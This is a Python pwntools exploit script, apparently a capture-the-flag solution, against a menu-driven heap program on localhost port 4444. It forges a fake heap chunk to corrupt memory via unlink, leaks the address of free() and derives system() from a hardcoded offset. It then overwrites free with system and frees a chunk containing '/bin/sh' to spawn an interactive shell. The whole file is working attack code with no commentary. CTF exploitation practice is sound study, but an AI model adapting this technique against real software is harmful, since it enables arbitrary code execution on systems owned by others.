from pwn import *
from struct import pack, unpack
s = tubes.remote.remote('localhost',4444)
def add(len_of_shellcode,content):
	s.sendlineafter('> ','2')
	s.sendlineafter('shellcode: ', str(len_of_shellcode))
	s.sendafter('): ', content)

def delete(shellcode_number):
	s.sendlineafter('> ','4') 
	s.sendlineafter(': ',str(shellcode_number))

def edit(shellcode_num,len_of_shellcode,content):
	s.sendlineafter('> ','3')
	s.sendlineafter('number: ', str(shellcode_num))
	s.sendlineafter('shellcode: ', str(len_of_shellcode))
	s.sendlineafter('shellcode: ', content)

def List():
	print s.sendlineafter('> ','1'),'1'
	return s.recvuntil('SHELLC0DE 2: ')
add(256,256*'A')
add(256,256*'B')
add(256,256*'C')
add(256,256*'D')

#gdb.attach(s, '''x/20xg 0x6016C0''')

edit(0,2*256,pack('Q',0)+pack('Q',1)+pack('Q',0x6016b8)+pack('Q',0x6016c0)+'a'*(0x100-0x20) + pack('Q',0x100)+pack('Q',0x110)+(0x100-0x10)*'b')
#gdb.attach(s, '''x/20xg 0x6016C0''')
delete(1)
#gdb.attach(s)
edit(0,0x20,pack('Q',0)+pack('Q',1)+pack('Q',8)+pack('Q',0x000000601600))

free_address = List()#.decode('hex')
print free_address
pos = free_address.find(': ')
free_addr = free_address[pos+2:pos+18]
free_address =  unpack('<Q',free_addr.decode('hex'))[0]
print hex(free_address)
offset = 0x7fdbe1119df0 - 0x7fdbe10dd52c#640
sys_addr = free_address - offset
print hex(sys_addr)

edit(0,8,pack('Q',sys_addr))
edit(2,8,'/bin/sh\x00')

gdb.attach(s, '''x/20xg 0x6016B8''')

delete(2)
s.interactive()

